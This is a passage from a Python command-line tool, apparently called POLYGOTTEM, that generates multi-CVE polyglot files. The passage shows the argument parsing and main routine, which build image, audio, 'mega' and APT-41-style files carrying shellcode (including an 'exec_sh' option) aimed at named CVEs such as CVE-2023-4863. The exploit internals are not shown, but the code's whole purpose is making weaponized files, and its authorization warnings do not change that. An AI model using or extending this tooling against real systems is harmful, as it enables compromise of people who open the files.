  # Generate mega polyglot (everything!)
  %(prog)s mega polyglot_mega.dat

  # Generate APT-41 cascading PE polyglot (NEW!)
  %(prog)s apt41 5AF0PfnN_replica.png

  # Custom polyglot with specific CVEs
  %(prog)s custom polyglot_custom.bin --cves CVE-2023-4863 CVE-2024-10573 CVE-2023-52356

  # List available presets
  %(prog)s --list-presets

Payload Options:
  -p, --payload    Payload type (poc_marker, nop_sled, exec_sh)
  --cves           Comma-separated list of CVE IDs (for custom type)
  -i, --interactive  Launch interactive multi-choice TUI menu (NEW!)

WARNING: These polyglots can trigger multiple vulnerabilities!
Only test on systems you own or have authorization to test!
        """
    )

    parser.add_argument('type',
                       nargs='?',
                       choices=['image', 'audio', 'apt41', 'mega', 'custom'],
                       help='Polyglot type')
    parser.add_argument('output',
                       nargs='?',
                       help='Output file path')
    parser.add_argument('-p', '--payload',
                       default='poc_marker',
                       choices=['poc_marker', 'nop_sled', 'exec_sh'],
                       help='Shellcode payload type')
    parser.add_argument('--cves',
                       nargs='+',
                       help='CVE IDs for custom polyglot (space-separated)')
    parser.add_argument('--list-presets',
                       action='store_true',
                       help='List available polyglot presets')
    parser.add_argument('-i', '--interactive',
                       action='store_true',
                       help='Launch interactive multi-choice TUI menu (NEW!)')
    parser.add_argument('--no-accel', action='store_true',
                       help='Disable Intel NPU/GPU hardware acceleration')
    parser.add_argument('--benchmark', action='store_true',
                       help='Run hardware acceleration benchmark')

    args = parser.parse_args()

    # Interactive mode - launch orchestrator
    if args.interactive:
        try:
            from polyglot_orchestrator import PolyglotOrchestrator
            orchestrator = PolyglotOrchestrator()
            orchestrator.run_interactive()
            return 0
        except ImportError as e:
            print(f"[!] Error: Interactive mode requires polyglot_orchestrator.py: {e}")
            print("[!] Make sure all TUI components are installed")
            return 1
        except Exception as e:
            print(f"[!] Error in interactive mode: {e}")
            import traceback
            traceback.print_exc()
            return 1

    # Hardware acceleration benchmark
    if args.benchmark:
        if ACCEL_AVAILABLE:
            accel = get_accelerator(verbose=True)
            print()
            accel.print_benchmark_results(size_mb=10.0)
            print()
        else:
            print("[!] Hardware acceleration not available (missing dependencies)")
        return 0

    # Initialize TUI
    tui = None
    if TUI is not None and sys.stdout.isatty():
        tui = TUI()

    polyglot = MultiCVEPolyglot(tui=tui, use_acceleration=not args.no_accel)

    # List presets if requested
    if args.list_presets:
        polyglot.list_presets()
        return 0

    # Validate arguments
    if not args.type or not args.output:
        parser.print_help()
        return 1

    # Show banner
    if tui:
        tui.banner("POLYGOTTEM Multi-CVE Polyglot Generator",
                  f"Combining Multiple Exploits into One File")
    else:
        print("\n=== Multi-CVE Polyglot Generator ===\n")

    # Generate shellcode
    shellcode = polyglot.generator.generate_shellcode(args.payload)

    if tui:
        print()
        tui.key_value("Polyglot type", args.type.upper(), 20)
        tui.key_value("Payload type", args.payload, 20)
        tui.key_value("Shellcode size", f"{len(shellcode):,} bytes", 20)
    else:
        print("[*] Multi-CVE Polyglot Generator")
        print(f"[*] Payload type: {args.payload}")
        print(f"[*] Shellcode size: {len(shellcode)} bytes")
    print()

    # Generate polyglot based on type
    try:
        if args.type == 'image':
            polyglot.create_image_polyglot(shellcode, args.output)
        elif args.type == 'audio':
            polyglot.create_audio_polyglot(shellcode, args.output)
        elif args.type == 'apt41':
            polyglot.create_apt41_cascading_polyglot(shellcode, args.output)
        elif args.type == 'mega':
            polyglot.create_mega_polyglot(shellcode, args.output)
        elif args.type == 'custom':
            if not args.cves:
                if tui:
                    tui.error("--cves argument required for custom polyglot type")
                else:
                    print("[!] Error: --cves required for custom polyglot type")
                return 1
            polyglot.create_custom_polyglot(args.cves, shellcode, args.output)

        # Test with file command
        print()
        if tui:
            tui.section("File Type Detection")
        else:
            print("[*] Testing with file command:")

        import subprocess
        result = subprocess.run(['file', args.output], capture_output=True, text=True)
        if tui:
            tui.info(f"file command reports: {result.stdout.strip()}")
        else:
            print(f"    {result.stdout.strip()}")

        # Final warnings
        print()
        if tui:
            tui.box("⚠ CRITICAL SECURITY WARNING", [
                "This file contains MULTIPLE CVE exploit payloads!",
                "",
                "Can trigger vulnerabilities in multiple libraries!",
                "Only use for authorized security testing!",
                "Educational and research purposes ONLY!",
                "",
                "NEVER distribute or use maliciously!"
            ])
        else:
            print("[!] WARNING: This file contains multiple exploit payloads!")
            print("[!] Only use for authorized security testing!")

        print()
        if tui:
            tui.success("Polyglot generation complete!")
        else:
            print("[+] Polyglot generation complete!")

        return 0

    except Exception as e:
        if tui:
            tui.error(f"Failed to generate polyglot: {e}")
        else:
            print(f"[!] Error generating polyglot: {e}")
        import traceback
        traceback.print_exc()
        return 1


if __name__ == '__main__':
    sys.exit(main())
